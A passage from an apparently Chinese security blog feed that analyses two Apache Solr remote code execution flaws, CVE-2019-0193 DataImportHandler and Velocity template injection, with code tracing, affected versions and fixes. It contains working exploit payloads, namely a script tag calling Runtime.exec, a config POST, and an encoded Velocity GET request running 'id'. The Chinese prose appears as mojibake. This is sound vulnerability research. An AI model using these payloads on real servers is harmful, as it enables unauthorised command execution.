class="keyword">if</span>(requestParams.getContentStream() == <span class="keyword">null</span> &amp;&amp; !requestParams.isSyncMode())&#123;</span><br><span class="line">            importer.runAsync(requestParams, sw);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (DataImporter.RELOAD_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rsp.add(<span class="string">"status"</span>, importer.isBusy() ? <span class="string">"busy"</span> : <span class="string">"idle"</span>);</span><br><span class="line">    rsp.add(<span class="string">"importResponse"</span>, message);</span><br><span class="line">    rsp.add(<span class="string">"statusMessages"</span>, importer.getStatusMessages());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼šæå–å‡ºrequestçš„å‚æ•°ï¼Œç„¶åå…³é”®åœ¨ç¬¬18-39è¡Œï¼Œå¦‚æœæ˜¯è°ƒè¯•æ¨¡å¼(requestParams.isDebug())ï¼Œåˆ™åŒæ­¥æ‰§è¡Œimporterï¼Œå¦‚æœä¸æ˜¯åˆ™å¼‚æ­¥æ‰§è¡Œï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œå¯ä»¥æŠŠpayloadåŠ ä¸€ä¸ª<code>debug=true</code>å‚æ•°ï¼Œè°ƒè¯•åŒæ­¥çš„åˆ†æ”¯ï¼š</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103165424861.png" alt="image-20191103165424861"></p><p>ç»§ç»­å‘ä¸‹è·Ÿï¼Œ<code>DataImporter#runCmd()</code>è°ƒç”¨<code>DataImporter#doFullImport()</code>â€”â€”å› ä¸ºæˆ‘ä»¬å‚æ•°æ˜¯<code>command=full-import</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFullImport</span><span class="params">(DIHWriter writer, RequestInfo requestParams)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">"Starting Full Import"</span>);</span><br><span class="line">    setStatus(Status.RUNNING_FULL_DUMP);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      DIHProperties dihPropWriter = createPropertyWriter();</span><br><span class="line">      setIndexStartTime(dihPropWriter.getCurrentTimestamp());</span><br><span class="line">      docBuilder = <span class="keyword">new</span> DocBuilder(<span class="keyword">this</span>, writer, dihPropWriter, requestParams);</span><br><span class="line">      checkWritablePersistFile(writer, dihPropWriter);</span><br><span class="line">      docBuilder.execute();</span><br><span class="line">      <span class="keyword">if</span> (!requestParams.isDebug())</span><br><span class="line">        cumulativeStatistics.add(docBuilder.importStatistics);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œå¤§æ¦‚å°±å¯ä»¥çŒœåˆ°é—®é¢˜åœ¨ç¬¬9è¡Œâ€”â€”<code>docBuilder.execute()</code>äº†ï¼Œå¯¼å…¥çš„dataConfigæ—¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œè€Œconfigä¸­å¯ä»¥è‡ªå†™jsè„šæœ¬ï¼Œåˆæƒ³åˆ°Nashornè§£æçš„jsè„šæœ¬èƒ½æ‰§è¡Œjavaå‘½ä»¤ï¼Œè¿™å°±å¯¼è‡´äº†æœ¬æ¬¡çš„æ¼æ´ã€‚</p><p>è·Ÿå®Œåç»­çš„è°ƒç”¨æ ˆå§ï¼Œsinkç‚¹åœ¨<code>ScriptTransformer#initEngine()</code>çš„87è¡Œâ€”â€”<code>ScriptEngine#eval(String)</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org.apache.solr.handler.dataimport.DocBuilder#doFullDump</span><br><span class="line">  DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl)</span><br><span class="line">    DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl, List&lt;EntityProcessorWrapper&gt;):L476</span><br><span class="line">      EntityProcessorWrapper#nextRow:L280</span><br><span class="line">        EntityProcessorWrapper#loadTransformers // ä¸»åŠ›é‡Œé¢çš„ç¬¬100-111è¡Œï¼Œå¦‚æœå‘ç°scriptæ ‡ç­¾ï¼Œåˆ™å‘transformersåŠ å…¥è§£æjsçš„transformer</span><br><span class="line">        EntityProcessorWrapper#applyTransformer:L222</span><br><span class="line">          ScriptTransformer#transformRow:L52</span><br><span class="line">           ScriptTransformer#initEngine:L87</span><br><span class="line">             ScriptEngine#eval(String) //è¿™é‡Œçš„stringå°±æ˜¯ä¹‹å‰scripté‡Œçš„å†…å®¹</span><br><span class="line">           javax.script.Invocable#invokeFunction//è¿™é‡Œè°ƒç”¨ä¹‹å‰funcå®šä¹‰çš„å†…å®¹ï¼Œäº§ç”ŸRCE</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨<code>ScriptEngine#eval(String)</code>å¤„å°±ç›´æ¥RCEï¼Œå³å°†scriptç›´æ¥æ¢æˆå¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">&lt;![CDATA[java.lang.Runtime.getRuntime().exec("calc");]]&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·ç¨‹åºæ—¥å¿—ä¼šæœ‰æŠ¥é”™ï¼Œå› ä¸ºinvokeFunctionæ‰¾ä¸åˆ°ï¼Œç»¼ä¸Šæœ¬æ–‡è¿˜æ˜¯é€‰æ‹©äº†å®šä¹‰å‡½æ•°çš„payloadã€‚</p><h1 id="å½±å“èŒƒå›´å’Œä¿®å¤"><a href="#å½±å“èŒƒå›´å’Œä¿®å¤" class="headerlink" title="å½±å“èŒƒå›´å’Œä¿®å¤"></a>å½±å“èŒƒå›´å’Œä¿®å¤</h1><p>æ­¤æ¼æ´å½±å“solr&lt;=8.1.1ï¼Œå¯¹æ¯”8.2.0å¯ä»¥çœ‹åˆ°ä¿®å¤æ–¹æ¡ˆï¼š</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202031725.png" alt="image-20191103202031725"></p><p>å³dataConfigå‚æ•°å¿…é¡»è¦dataConfigParam_enabledä¸ºTrueæ—¶æ‰èƒ½ä½¿ç”¨ï¼Œå¯ä»¥åœ¨é…ç½®æˆ–å¯åŠ¨å‘½ä»¤ä¸­è®¾ç½®<code>-Denable .dih.dataConfigParam=true</code></p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202135491.png" alt="image-20191103202135491"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>8æœˆä»½çš„ä¸€ä¸ªæ´äº†ï¼Œä¸€ç›´å¿™åˆ°ç°åœ¨æ‰çœ‹ï¼Œæœ¬èº«æ¼æ´ä¸å¤æ‚ï¼Œä½†å…¶ä¸­é™„åŠ è°ƒè¯•å’Œæ‰¾javaWebå…¥å£ç‚¹çš„æŠ€å·§å€¼å¾—å­¦ä¹ ã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li><p>CVE-2019-0193 APACHE SOLR è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æï¼Œ <a href="https://kylingit.com/blog/cve-2019-0193-apache-solrè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æ/" target="_blank" rel="noopener">https://kylingit.com/blog/cve-2019-0193-apache-solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a> </p></li><li><p>è¯¦ç»†åˆ†æSolrçš„CVE-2019-0193ä»¥åŠvelocityæ¨¡æ¿æ³¨å…¥æ–°æ´ï¼Œ <a href="https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ</a></p></li><li>Apache Solr DataImportHandler è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2019-0193) åˆ†æï¼Œ <a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">https://paper.seebug.org/1009/</a> </li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;å…ˆåˆ°solrä¸Šä¸‹è½½jarå’Œsrcï¼Œè¿™é‡Œé€‰æ‹©çš„ç‰ˆæœ¬ä¸ºv8.1.0&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="æ¼æ´åˆ†æ" scheme="http://anemone.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="æ¼æ´åˆ†æ" scheme="http://anemone.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Solr" scheme="http://anemone.top/tags/Solr/"/>
    
  </entry>
  
  <entry>
    <title>Solr Velocityæ¨¡æ¿æ³¨å…¥æ¼æ´åˆ†æ</title>
    <link href="http://anemone.top/vulnresearch-Solr_Velocity_injection/"/>
    <id>http://anemone.top/vulnresearch-Solr_Velocity_injection/</id>
    <published>2019-11-03T12:30:49.000Z</published>
    <updated>2019-12-08T12:57:03.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä¸‹è½½å—å½±å“ç‰ˆæœ¬çš„solrï¼Œè¿™é‡Œä¾ç„¶é€‰æ‹©v8.1.0ï¼Œè¿™é‡Œæ³¨æ„é™¤äº†æ·»åŠ solrçš„jarè¿˜éœ€è¦æ·»åŠ velocityçš„ï¼ˆæºç çš„åŒ–å¯ä»¥è®©IDEAä»mavenä¸Šä¸‹æºç ï¼‰ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124205421987.png" alt="image-20191124205421987"></p><p>åŒæ ·çš„æ–¹æ³•å¯åŠ¨é¡¹ç›®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0</span><br><span class="line">$ <span class="built_in">cd</span> server/ <span class="comment">#ä¸€å®šè¦åœ¨serverä¸‹è¿è¡Œ</span></span><br><span class="line">anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --module=http</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><h2 id="0x00-æ£€æŸ¥coreæ˜¯å¦å…è®¸velocity"><a href="#0x00-æ£€æŸ¥coreæ˜¯å¦å…è®¸velocity" class="headerlink" title="0x00  æ£€æŸ¥coreæ˜¯å¦å…è®¸velocity"></a>0x00  æ£€æŸ¥coreæ˜¯å¦å…è®¸velocity</h2><p>æ£€æŸ¥<code>{core}/conf/solrconfig.xml</code>ä¸­æ˜¯å¦å…è®¸solr.VelocityResponseWriterï¼Œå…·ä½“æ¥è¯´ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ä¸€å®šè¦åŠ ä¾èµ–ï¼Œå¦åˆ™ä¼šæŠ¥é”™400ï¼Œæ‰¾ä¸åˆ°velocityç±» --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"$&#123;solr.install.dir:../../../..&#125;/contrib/velocity/lib"</span> <span class="attr">regex</span>=<span class="string">".*\.jar"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"$&#123;solr.install.dir:../../../..&#125;/dist/"</span> <span class="attr">regex</span>=<span class="string">"solr-velocity-\d.*\.jar"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- å¼€å¯velocityResponse --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">queryResponseWriter</span> <span class="attr">name</span>=<span class="string">"velocity"</span> <span class="attr">class</span>=<span class="string">"solr.VelocityResponseWriter"</span> <span class="attr">startup</span>=<span class="string">"lazy"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">str</span> <span class="attr">name</span>=<span class="string">"template.base.dir"</span>&gt;</span>$&#123;velocity.template.base.dir:&#125;<span class="tag">&lt;/<span class="name">str</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">queryResponseWriter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰éœ€è¦åŠ ä¸Šï¼Œå¹¶ä¸”é‡å¯solr</p><h2 id="0x01-è®¾ç½®params-resource-loader-enabled-true"><a href="#0x01-è®¾ç½®params-resource-loader-enabled-true" class="headerlink" title="0x01 è®¾ç½®params.resource.loader.enabled=true"></a>0x01 è®¾ç½®params.resource.loader.enabled=true</h2><p>è®¾ç½®VelocityResponseWriteræ’ä»¶çš„params.resource.loader.enabledé€‰é¡¹è®¾ç½®ä¸ºtrueï¼Œå³å…è®¸åœ¨Solrè¯·æ±‚å‚æ•°ä¸­å…è®¸æ¨¡æ¿ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/config</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "update-queryresponsewriter": &#123;</span><br><span class="line">    "startup": "lazy",</span><br><span class="line">    "name": "velocity",</span><br><span class="line">    "class": "solr.VelocityResponseWriter",</span><br><span class="line">    "template.base.dir": "",</span><br><span class="line">    "solr.resource.loader.enabled": "true",</span><br><span class="line">    "params.resource.loader.enabled": "true"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡è¿”å›200å¹¶ä¸”è§‚å¯Ÿåˆ°<code>${solr_home}/example/example-DIH/solr/tika/conf</code>ä¸‹å‡ºç°<code>configoverlay.json</code>è¡¨ç¤ºè®¾ç½®æˆåŠŸã€‚</p><h2 id="0x02-é€šè¿‡Velocityæ¨¡æ¿æ³¨å…¥è¿›è¡ŒRCE"><a href="#0x02-é€šè¿‡Velocityæ¨¡æ¿æ³¨å…¥è¿›è¡ŒRCE" class="headerlink" title="0x02 é€šè¿‡Velocityæ¨¡æ¿æ³¨å…¥è¿›è¡ŒRCE"></a>0x02 é€šè¿‡Velocityæ¨¡æ¿æ³¨å…¥è¿›è¡ŒRCE</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/solr/tika/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost.com:8983</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>è¿”å›åŒ…ä¸­çœ‹åˆ°å‘½ä»¤æ‰§è¡Œç»“æœï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124164155298.png" alt="image-20191124164155298"></p><h3 id="Velocity-RCEæ–¹æ³•"><a href="#Velocity-RCEæ–¹æ³•" class="headerlink" title="Velocity RCEæ–¹æ³•"></a>Velocity RCEæ–¹æ³•</h3><p>urldecodeä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°velocityè¿›è¡ŒRCEçš„payloadï¼Œç•™ç€ä»¥åå¯èƒ½æœ‰ç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&apos;&apos;) </span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;)) </span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;)) </span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;)) </span><br><span class="line">#set($ex=$rt.getRuntime().exec(&apos;id&apos;))+$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream()) </span><br><span class="line">#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure><h1 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h1><p>Solr&lt;=8.2.0 ä¸”coreå…è®¸velocityæ¨¡æ¿ã€‚</p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="solr-core-config"><a href="#solr-core-config" class="headerlink" title="/solr/{core}/config"></a>/solr/{core}/config</h2><p>è¿˜æ˜¯è·Ÿä¸Šæ¬¡ä¸€æ ·ï¼Œæ–­ç‚¹ä¸‹åœ¨org.apache.solr.servlet.HttpSolrCall#call:519è¿™é‡Œï¼Œè°ƒè¯•ç¬¬ä¸€ä¸ªè¯·æ±‚ï¼Œè¿˜æ˜¯é€šè¿‡å¦‚ä¸‹è°ƒç”¨æ ˆï¼Œäº¤ç»™handlerå¤„ç†è¯·æ±‚ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.solr.servlet.HttpSolrCall#call:542</span><br><span class="line">  org.apache.solr.servlet.HttpSolrCall#execute():756</span><br><span class="line">    org.apache.solr.core.SolrCore#execute:2566</span><br><span class="line">      org.apache.solr.request.SolrRequestHandler#handleRequest:199</span><br><span class="line">        org.apache.solr.handler.SolrConfigHandler#handleRequestBody</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ­¤å¤„ç†çš„handleræ˜¯SolrConfigHandlerï¼Œå…¶å°†æ¥å—çš„postå‚æ•°åˆ›å»ºä¸ºcommandå¯¹è±¡ï¼ˆ129è¡Œï¼‰ï¼Œç„¶åè°ƒç”¨å®ƒçš„handlePOST()æ–¹æ³•ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124175443383.png" alt="image-20191124175443383"></p><p>handlePOST()æ–¹æ³•å¦‚ä¸‹ï¼Œå…¶è·å–commandçš„æ“ä½œï¼Œä»¥åŠéœ€è¦è¦†ç›–çš„åŸé…ç½®ï¼Œè°ƒCommand#handleCommandsï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124175720679.png" alt="image-20191124175720679"></p><p>Command#handleCommands(ops, overlay)ï¼Œå…¶æ˜¯ä¸€ä¸ªswitch-caseç»“æ„ï¼Œè¿™é‡Œèµ°çš„æ˜¯é»˜è®¤åˆ†æ”¯ï¼Œç„¶åè°ƒç”¨Command#updateNamedPluginæ›´æ–°ä¹‹å‰çš„é…ç½®ï¼ˆoverlayå˜é‡ï¼‰ï¼Œå†å°†é…ç½®ä¿å­˜åˆ°zkæˆ–è€…æœ¬åœ°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleCommands</span><span class="params">(List&lt;CommandOperation&gt; ops, ConfigOverlay overlay)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (CommandOperation op : ops) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (op.name) &#123;</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line">        <span class="keyword">default</span>: &#123;</span><br><span class="line">          List&lt;String&gt; pcs = StrUtils.splitSmart(op.name.toLowerCase(Locale.ROOT), <span class="string">'-'</span>);</span><br><span class="line">          <span class="keyword">if</span> (pcs.size() != <span class="number">2</span>) &#123;<span class="comment">/*...*/</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String prefix = pcs.get(<span class="number">0</span>);</span><br><span class="line">            String name = pcs.get(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmdPrefixes.contains(prefix) &amp;&amp; namedPlugins.containsKey(name)) &#123;</span><br><span class="line">              SolrConfig.SolrPluginInfo info = namedPlugins.get(name);</span><br><span class="line">              <span class="keyword">if</span> (<span class="string">"delete"</span>.equals(prefix)) &#123;</span><br><span class="line">                overlay = deleteNamedComponent(op, overlay, info.getCleanTag());</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                overlay = updateNamedPlugin(info, op, overlay, prefix.equals(<span class="string">"create"</span>) || prefix.equals(<span class="string">"add"</span>)); <span class="comment">//è¿™é‡Œæ›´æ–°é…ç½®ï¼ˆoverlayå˜é‡ï¼‰</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              op.unknownOperation();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    List errs = CommandOperation.captureErrors(ops);</span><br><span class="line">    <span class="keyword">if</span> (!errs.isEmpty()) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    SolrResourceLoader loader = req.getCore().getResourceLoader();</span><br><span class="line">    <span class="keyword">if</span> (loader <span class="keyword">instanceof</span> ZkSolrResourceLoader) &#123;<span class="comment">/*...*/</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      SolrResourceLoader.persistConfLocally(loader, ConfigOverlay.RESOURCE_NAME, overlay.toByteArray()); <span class="comment">// å°†é…ç½®ä¿å­˜åˆ°æœ¬åœ°</span></span><br><span class="line">      req.getCore().getCoreContainer().reload(req.getCore().getName()); <span class="comment">// æ›´æ–°é…ç½®</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>28è¡Œï¼ˆå®é™…ä»£ç 504è¡Œï¼‰ä¼šå°†é…ç½®ä¿å­˜åˆ°æœ¬åœ°ï¼Œä¹Ÿå°±æ˜¯<code>{core}/conf/configoverlay.json</code>æ–‡ä»¶äº†ã€‚</p><p>é‚£ä¹ˆæ€»ç»“ä¸€ä¸‹è°ƒç”¨æ ˆå°±æ˜¯ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124181632402.png" alt="image-20191124181632402"></p><h2 id="solr-core-select"><a href="#solr-core-select" class="headerlink" title="/solr/{core}/select"></a>/solr/{core}/select</h2><p> è¿™ä¸ªAPIåŸå…ˆåº”è¯¥æ˜¯æ•°æ®åº“æŸ¥è¯¢ç”¨çš„ï¼Œä½†ç°åœ¨ç”±äºå…è®¸äº†æ‰§è¡Œå‚æ•°ä¸­æŒ‡å®šçš„velocityï¼Œé€ æˆäº†SSTIï¼Œæˆ‘ä»¬é‡æ–°çœ‹ä¸€ä¸‹org.apache.solr.servlet.HttpSolrCall#callæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span 